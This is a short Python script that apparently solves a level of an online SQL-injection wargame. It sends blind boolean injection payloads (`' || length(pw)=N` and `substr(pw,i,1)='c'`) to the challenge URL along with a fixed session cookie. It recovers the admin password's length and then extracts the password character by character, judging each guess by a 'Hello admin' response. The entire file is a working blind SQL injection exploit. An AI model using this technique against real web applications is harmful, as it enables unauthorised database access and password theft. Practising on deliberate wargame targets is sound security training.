import requests as req

flag = ""
length = 0

url = "https://los.rubiya.kr/chall/orc_60e5b360f95c1f9688e4f3a86c5dd494.php?pw="
session = dict(PHPSESSID = "vg0m4ent3t4va9280obloa8pkb")

print ("[+] Start")
print ("[+] Find length")

for i in range (0, 20):
    try:
        query = url + "100\' || length(pw) =" + str(i) + "%23"
        res = req.post(query, cookies = session)

    except:
        print ('[-] Error occured')
        continue

    if 'Hello admin' in res.text:
        length = i
        break

print("[+] length : ", length)
print("[+] find password")

for i in range (1, length + 1):
    for j in range (48, 128):
        try:
            query = url + "100' || substr(pw, " + str(i) +", 1)='" + chr(j)
            res = req.post(query, cookies = session)

        except:
            print("[-] Error occured")
            continue

        if 'Hello admin' in res.text:
            flag += chr(j)
            print("[+] Found : " + str(i), " : ", flag)
            break

print ("[+] Password : ", flag)
